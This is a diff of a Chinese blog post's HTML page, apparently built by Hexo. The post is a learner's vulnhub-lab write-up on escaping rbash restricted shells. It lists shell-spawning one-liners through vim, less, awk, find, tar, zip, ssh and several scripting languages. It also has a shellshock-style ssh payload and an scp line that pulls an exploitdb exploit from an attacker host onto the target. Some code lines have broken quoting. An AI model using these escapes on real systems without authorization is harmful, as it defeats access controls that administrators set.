@@ -5,7 +5,11 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="Linux提权学习之rbash逃逸, hybcx&#39;s blog">
-    <meta name="description" content="">
+    <meta name="description" content="0x01 前言
+本文的产生也是在刷vulnhub靶场的时候遇到的，由于自身太菜，因此可以看到本文的知识都是cv的┭┮﹏┭┮，自己的想法很少的，也就实操那一部分会跟着做做，还请见谅~~
+0x02 rbash简述
+1、什么是rbash
+它与一般">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,27 +17,48 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
     <title>Linux提权学习之rbash逃逸 | hybcx&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
+    
 
-    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
-    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-    <link rel="stylesheet" type="text/css" href="/css/matery.css">
-    <link rel="stylesheet" type="text/css" href="/css/my.css">
 
-    <script src="/libs/jquery/jquery.min.js"></script>
+    <!-- bg-cover style     -->
 
-<meta name="generator" content="Hexo 6.3.0">
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
-
-
 
 
 <body>
@@ -45,7 +70,7 @@
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">hybcx&#39;s blog</span>
+                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
                 </a>
             </div>
             
@@ -135,6 +160,11 @@
       <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
     </a>
   </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
 </ul>
 
 
@@ -151,8 +181,6 @@
             
         </div>
     </div>
-
-    
 
     <ul class="menu-list mobile-menu-list">
         
@@ -330,99 +358,7 @@
 <main class="post-container content">
 
     
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-<style>
-    #articleContent h1::before,
-    #articleContent h2::before,
-    #articleContent h3::before,
-    #articleContent h4::before,
-    #articleContent h5::before,
-    #articleContent h6::before {
-        display: block;
-        content: " ";
-        height: 100px;
-        margin-top: -100px;
-        visibility: hidden;
-    }
-
-    #articleContent :focus {
-        outline: none;
-    }
-
-    .toc-fixed {
-        position: fixed;
-        top: 64px;
-    }
-
-    .toc-widget {
-        width: 345px;
-        padding-left: 20px;
-    }
-
-    .toc-widget .toc-title {
-        padding: 35px 0 15px 17px;
-        font-size: 1.5rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    .toc-widget ol {
-        padding: 0;
-        list-style: none;
-    }
-
-    #toc-content {
-        padding-bottom: 30px;
-        overflow: auto;
-    }
-
-    #toc-content ol {
-        padding-left: 10px;
-    }
-
-    #toc-content ol li {
-        padding-left: 10px;
-    }
-
-    #toc-content .toc-link:hover {
-        color: #42b983;
-        font-weight: 700;
-        text-decoration: underline;
-    }
-
-    #toc-content .toc-link::before {
-        background-color: transparent;
-        max-height: 25px;
-
-        position: absolute;
-        right: 23.5vw;
-        display: block;
-    }
-
-    #toc-content .is-active-link {
-        color: #42b983;
-    }
-
-    #floating-toc-btn {
-        position: fixed;
-        right: 15px;
-        bottom: 76px;
-        padding-top: 15px;
-        margin-bottom: 0;
-        z-index: 998;
-    }
-
-    #floating-toc-btn .btn-floating {
-        width: 48px;
-        height: 48px;
-    }
-
-    #floating-toc-btn .btn-floating i {
-        line-height: 48px;
-        font-size: 1.4rem;
-    }
-</style>
-<div class="row">
+    <div class="row">
     <div id="main-content" class="col s12 m12 l9">
         <!-- 文章内容详情 -->
 <div id="artDetail">
@@ -463,12 +399,32 @@
                 
 
                 
-
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-09-27
+                </div>
                 
 
                 
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3k
+                </div>
+                
 
                 
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    12 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
             </div>
         </div>
         <hr class="clearfix">
@@ -488,51 +444,71 @@
 <h2 id="1、什么是rbash">1、什么是rbash</h2>
 <p>它与一般shell的区别在于会限制一些行为，让一些命令无法执行</p>
 <h2 id="2、如何设置一个rbash">2、如何设置一个rbash</h2>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /bin/bash /bin/rbash <span class="hljs-comment"># 复制一个bash，重命名为rbash</span><br>useradd -s /bin/rbash <span class="hljs-built_in">test</span> <span class="hljs-comment"># 设置用户test登陆的shell为rbash</span><br><span class="hljs-built_in">mkdir</span> -p /home/test/.bin <span class="hljs-comment"># 在test用户下新建一个.bin目录存放可以执行的命令</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /bin/bash /bin/rbash <span class="token comment"># 复制一个bash，重命名为rbash</span>
+<span class="token function">useradd</span> <span class="token parameter variable">-s</span> /bin/rbash <span class="token builtin class-name">test</span> <span class="token comment"># 设置用户test登陆的shell为rbash</span>
+<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /home/test/.bin <span class="token comment"># 在test用户下新建一个.bin目录存放可以执行的命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h2 id="3、使用场景">3、使用场景</h2>
 <p>Linux Restricted Shell是一种限制命令(如：cd、ls、echo等)、阻止环境变量（如：shell、path、user），甚至于阻止管道/重定向（如：&gt;，&gt;&gt;，|）的shell。</p>
 <p><strong>常见的Linux Restricted Shell有rbash、rksh、rsh。</strong></p>
 <p>Linux Restricted Shell有如下场景使用</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1. 提高系统安全性<br>2. 阻止黑客执行高危命令<br>3. 系统管理员创建受限制Shell，进而防止普通用户执行危险命令<br>4. 部分CTF赛题，如Root-Me、HackThebox、vulnhub<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">1. 提高系统安全性
+2. 阻止黑客执行高危命令
+3. 系统管理员创建受限制Shell，进而防止普通用户执行危险命令
+4. 部分CTF赛题，如Root-Me、HackThebox、vulnhub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <h1>0x03 信息搜集</h1>
 <p>这里我们主要是通过信息搜集来确定当下的rbash环境下可以执行那些命令，以及环境信息。</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. 检查可用的命令，如：<span class="hljs-built_in">cd</span>、<span class="hljs-built_in">ls</span>、<span class="hljs-built_in">echo</span>等<br>2. 检查运算符，如：&gt;、&gt;&gt;、|、&lt;等<br>3. 检查可用的编程语言，如：php、perl、ruby、python等<br>4. 哪些命令可以作为root (sudo -l)运行<br>5. 检查具有SUID perm权限的文件或命令<br>6. 检查当前使用的shell：<span class="hljs-built_in">echo</span> <span class="hljs-variable">$shell</span><br>7. 检查环境变量：运行<span class="hljs-built_in">env</span>、<span class="hljs-built_in">printenv</span>、<span class="hljs-built_in">set</span>等<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. 检查可用的命令，如：cd、ls、echo等
+<span class="token number">2</span>. 检查运算符，如：<span class="token operator">&gt;</span>、<span class="token operator">&gt;&gt;</span>、<span class="token operator">|</span>、<span class="token operator">&lt;</span>等
+<span class="token number">3</span>. 检查可用的编程语言，如：php、perl、ruby、python等
+<span class="token number">4</span>. 哪些命令可以作为root <span class="token punctuation">(</span>sudo -l<span class="token punctuation">)</span>运行
+<span class="token number">5</span>. 检查具有SUID perm权限的文件或命令
+<span class="token number">6</span>. 检查当前使用的shell：echo <span class="token variable">$shell</span>
+<span class="token number">7</span>. 检查环境变量：运行env、printenv、set等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>通过以上操作,我们已收集到一些有用的信息，接下来尝试一下通用的利用方法。</p>
 <h1>0x04 常用逃逸命令</h1>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. 如果允许使用“/”，则可以运行/bin/sh、/bin/bash<br>2. 如果允许使用<span class="hljs-built_in">cp</span>命令，则可以复制/bin/sh或者/bin/bash到当前目录<br>3. 使用ftp进行命令执行，执行 !/bin/sh<br>4. 使用gdb进行命令执行，执行 !/bin/sh<br>5. 使用more/man/less进行命令执行，执行 !/bin/sh<br>6. 使用vim进行命令执行，执行 !/bin/sh<br>7. 使用rvim执行:python，然后运行import os; os.system(<span class="hljs-string">"/bin/bash )</span><br><span class="hljs-string">8. 使用scp，通过scp来传入自己脚本</span><br><span class="hljs-string">9. 使用awk，执行awk 'BEGIN {system("</span>/bin/sh or /bin/bash<span class="hljs-string">")}'</span><br><span class="hljs-string">10. 使用find，执行find / -name test -exec /bin/sh or /bin/bash \</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. 如果允许使用“/”，则可以运行/bin/sh、/bin/bash
+<span class="token number">2</span>. 如果允许使用cp命令，则可以复制/bin/sh或者/bin/bash到当前目录
+<span class="token number">3</span>. 使用ftp进行命令执行，执行 <span class="token operator">!</span>/bin/sh
+<span class="token number">4</span>. 使用gdb进行命令执行，执行 <span class="token operator">!</span>/bin/sh
+<span class="token number">5</span>. 使用more/man/less进行命令执行，执行 <span class="token operator">!</span>/bin/sh
+<span class="token number">6</span>. 使用vim进行命令执行，执行 <span class="token operator">!</span>/bin/sh
+<span class="token number">7</span>. 使用rvim执行:python，然后运行import os<span class="token punctuation">;</span> os.system<span class="token punctuation">(</span><span class="token string">"/bin/bash )
+8. 使用scp，通过scp来传入自己脚本
+9. 使用awk，执行awk 'BEGIN {system("</span>/bin/sh or /bin/bash"<span class="token punctuation">)</span><span class="token punctuation">}</span>'
+<span class="token number">10</span>. 使用find，执行find / <span class="token parameter variable">-name</span> <span class="token builtin class-name">test</span> <span class="token parameter variable">-exec</span> /bin/sh or /bin/bash <span class="token punctuation">\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="4-1-如果允许使用“-”">4.1 如果允许使用“/”</h2>
 <p>则可以运行/bin/sh、/bin/bash</p>
-<p><img src="image-20230927195558597.png" alt="image-20230927195558597"></p>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927195558597.png" alt="image-20230927195558597"></p>
 <h2 id="4-2-如果允许使用cp命令">4.2 如果允许使用cp命令</h2>
 <p>则可以复制/bin/sh到当前目录，不过这里我没有复现成功cp /bin/bash，应该是环境条件不允许吧。—下面有补充</p>
-<p><img src="image-20230927200405517.png" alt="image-20230927200405517"></p>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927200405517.png" alt="image-20230927200405517"></p>
 <h2 id="4-3-使用ftp进行命令执行">4.3 使用ftp进行命令执行</h2>
 <p>执行 !/bin/sh</p>
-<p><img src="image-20230927195253320.png" alt="image-20230927195253320"></p>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927195253320.png" alt="image-20230927195253320"></p>
 <p>如上图所示的ftp命令</p>
 <h2 id="4-4-使用gdb进行命令执行">4.4 使用gdb进行命令执行</h2>
 <p>执行 !/bin/sh</p>
-<p><img src="image-20230927200626894.png" alt="image-20230927200626894"></p>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927200626894.png" alt="image-20230927200626894"></p>
 <p>不过前提就是该环境下有gdb环境</p>
 <h2 id="4-5-使用more-man-less进行命令执行">4.5 使用more/man/less进行命令执行</h2>
 <p>执行 !/bin/sh</p>
-<p><img src="image-20230927201047565.png" alt="image-20230927201047565"></p>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927201047565.png" alt="image-20230927201047565"></p>
 <p>这里那些文章介绍的不清楚，我复现了一下发现还是需要某种条件：也就是你当前目录下有足够大的内容的文本，这样more读取的时候才会体现出<strong>分页读取</strong>的效果，进而你可以直接输入!/bin/sh</p>
-<p><img src="image-20230927201358664.png" alt="image-20230927201358664"></p>
-<p><img src="image-20230927201600091.png" alt="image-20230927201600091"></p>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927201358664.png" alt="image-20230927201358664"></p>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927201600091.png" alt="image-20230927201600091"></p>
 <p>如图less不必非得读取内容多的文件</p>
-<p><img src="image-20230927201659205.png" alt="image-20230927201659205"></p>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927201659205.png" alt="image-20230927201659205"></p>
 <p>man似乎直接输入man man即可</p>
 <h2 id="4-6-使用vim进行命令执行">4.6 使用vim进行命令执行</h2>
 <p>执行 !/bin/sh</p>
-<p><img src="image-20230927201810774.png" alt="image-20230927201810774"></p>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927201810774.png" alt="image-20230927201810774"></p>
 <h2 id="4-7-使用rvim执行python">4.7 使用rvim执行python</h2>
 <p><code>python import os; os.system("/bin/bash")</code></p>
 <p>这里不知为何提示我在rvim中无法执行shell命令/禁止使用命令。</p>
 <p>但也可能是我不会操作吧。。。。</p>
 <h2 id="4-8-使用scp传入自己的脚本">4.8 使用scp传入自己的脚本</h2>
 <p>这里未复现</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">scp -S /path/yourscript x y:<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">scp -S /path/yourscript x y:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><strong>目标机器连接 kali 利用 ssh 将 exp 下载到靶机上来</strong></p>
 <blockquote>
 <p>scp &gt;<a href="mailto:root@192.168.26.20">root@192.168.26.20</a>:/usr/share/exploitdb/exploits/linux/local/46996.sh /tmp/     #靶机上执行  用户名和 IP 是 kali 的</p>
@@ -545,137 +521,178 @@
 </blockquote>
 <h2 id="4-9-使用awk命令执行">4.9 使用awk命令执行</h2>
 <p>执行<code>awk 'BEGIN {system("/bin/sh or /bin/bash")}'</code></p>
-<p><img src="image-20230927202910634.png" alt="image-20230927202910634"></p>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927202910634.png" alt="image-20230927202910634"></p>
 <p>不过这里更推荐使用一种，我这个环境不知为何使用不了bash，估计是我之前修改了吧</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">awk 'BEGIN {system("/bin/sh")}'<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">awk 'BEGIN {system("/bin/sh")}'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h2 id="4-10-使用find执行命令">4.10 使用find执行命令</h2>
-<p><img src="image-20230927203059460.png" alt="image-20230927203059460"></p>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927203059460.png" alt="image-20230927203059460"></p>
 <p>这里也是使用其中一个</p>
 <p>这里看了几篇文章，我再补充一下上述的cp命令：</p>
 <h2 id="4-11-补充">4.11 补充</h2>
 <h3 id="1、cp-bin-bash到本地用户目录">1、cp /bin/bash到本地用户目录</h3>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /bin/bash test1<br><span class="hljs-built_in">cp</span> /bin/sh test2<br>./test1 <span class="hljs-comment"># 切换到了/bin/bash</span><br>./test2 <span class="hljs-comment"># 切换到了/bin/sh</span><br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230927203517878.png" alt="image-20230927203517878"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /bin/bash test1
+<span class="token function">cp</span> /bin/sh test2
+./test1 <span class="token comment"># 切换到了/bin/bash</span>
+./test2 <span class="token comment"># 切换到了/bin/sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927203517878.png" alt="image-20230927203517878"></p>
 <p>执行：<code>git &gt; git help status</code> --这里说git也可，但我没有找到方法</p>
 <h3 id="2、set-shell">2、set shell</h3>
 <p><strong>DC-2靶机使用它成功了</strong></p>
 <ul>
 <li>在一些编辑器中可以设置shell变量然后执行，如vim中</li>
 </ul>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># vim/vi进入之后</span><br>:<span class="hljs-built_in">set</span> shell=/bin/sh <span class="hljs-comment"># 或者用/bin/bash</span><br>:shell<br><br><span class="hljs-comment"># 切换完成之后还要添加环境变量。给$PATH变量增加两个路径，用来查找命令</span><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/bin/<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/usr/bin/<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># vim/vi进入之后</span>
+:set <span class="token assign-left variable">shell</span><span class="token operator">=</span>/bin/sh <span class="token comment"># 或者用/bin/bash</span>
+:shell
+
+<span class="token comment"># 切换完成之后还要添加环境变量。给$PATH变量增加两个路径，用来查找命令</span>
+<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/bin/
+<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/usr/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="3、更改PATH或SHELL环境变量">3、更改PATH或SHELL环境变量</h3>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">执行：export -p # 查看系统的环境变量设置<br><br>PATH 和 SHELL 变量的权限设置很可能是：“-rx” ，这就意味着我们只能执行和读取，不能写入。如果有w权限的话，我们可以直接给它写入/bin/bash<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230927204458332.png" alt="image-20230927204458332"></p>
+<pre class="line-numbers language-none"><code class="language-none">执行：export -p # 查看系统的环境变量设置
+
+PATH 和 SHELL 变量的权限设置很可能是：“-rx” ，这就意味着我们只能执行和读取，不能写入。如果有w权限的话，我们可以直接给它写入/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927204458332.png" alt="image-20230927204458332"></p>
 <h1>0x05 编程语言逃逸</h1>
 <h2 id="5-1-Python">5.1 Python</h2>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">"import os;os.system('/bin/bash')"</span><br>或者<br>python -c <span class="hljs-string">"import pty;pty.spawn('/bin/bash')"</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"import os;os.system('/bin/bash')"</span>
+或者
+python <span class="token operator">-</span>c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h2 id="5-2-PHP">5.2 PHP</h2>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php -a then <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">"sh -i"</span>)<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">php <span class="token operator">-</span>a then <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sh -i"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h2 id="5-3-perl">5.3 perl</h2>
-<figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">perl -e <span class="hljs-string">"exec '/bin/sh';"</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-perl" data-language="perl"><code class="language-perl">perl <span class="token operator">-e</span> <span class="token string">"exec '/bin/sh';"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h2 id="5-4-lua">5.4 lua</h2>
-<figure class="highlight lua"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">os</span>.<span class="hljs-built_in">execute</span>(<span class="hljs-string">'/bin/sh'</span>)<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">os<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h2 id="5-5-Ruby">5.5 Ruby</h2>
-<figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">exec <span class="hljs-string">"/bin/sh"</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">exec <span class="token string-literal"><span class="token string">"/bin/sh"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h2 id="5-6-except">5.6 except</h2>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">except spawn sh then sh.<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">except spawn sh then sh.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>不过这些编程语言的用法未曾复现，我发现在kali上输入的时候没反应，估计是环境不匹配吧。暂作记录</p>
 <h1>0x06 高级技术</h1>
 <h2 id="6-1-ssh">6.1 ssh</h2>
-<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">1.ssh username@IP -t "/bin/sh" or "/bin/bash"<br>2.ssh username@IP -t "bash --noprofile"<br>3.ssh username@IP -t "() { :; }; /bin/bash" (sehllshock)<br>4.ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 127.0.0.1 (SUID)<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>.ssh username@IP <span class="token parameter variable">-t</span> <span class="token string">"/bin/sh"</span> or <span class="token string">"/bin/bash"</span>
+<span class="token number">2</span>.ssh username@IP <span class="token parameter variable">-t</span> <span class="token string">"bash --noprofile"</span>
+<span class="token number">3</span>.ssh username@IP <span class="token parameter variable">-t</span> <span class="token string">"() { :; }; /bin/bash"</span> <span class="token punctuation">(</span>sehllshock<span class="token punctuation">)</span>
+<span class="token number">4</span>.ssh <span class="token parameter variable">-o</span> <span class="token assign-left variable">ProxyCommand</span><span class="token operator">=</span><span class="token string">"sh -c /tmp/yourfile.sh"</span> <span class="token number">127.0</span>.0.1 <span class="token punctuation">(</span>SUID<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="6-2-zip">6.2 zip</h2>
-<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zip</span> /tmp/test.zip /tmp/test <span class="token parameter variable">-T</span> --unzip-command<span class="token operator">=</span><span class="token string">"sh -c /bin/bash"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h2 id="6-3-tar">6.3 tar</h2>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=<span class="hljs-built_in">exec</span>=/bin/bash<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> cf /dev/null testfile <span class="token parameter variable">--checkpoint</span><span class="token operator">=</span><span class="token number">1</span> --checkpoint-action<span class="token operator">=</span>exec<span class="token operator">=</span>/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h2 id="6-4-pico">6.4 pico</h2>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">执行pico -s <span class="hljs-string">"/bin/bash"</span>，然后写入/bin/bash，并且执行CTRL+T<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230927212137229.png" alt="image-20230927212137229"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">执行pico <span class="token parameter variable">-s</span> <span class="token string">"/bin/bash"</span>，然后写入/bin/bash，并且执行CTRL+T<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927212137229.png" alt="image-20230927212137229"></p>
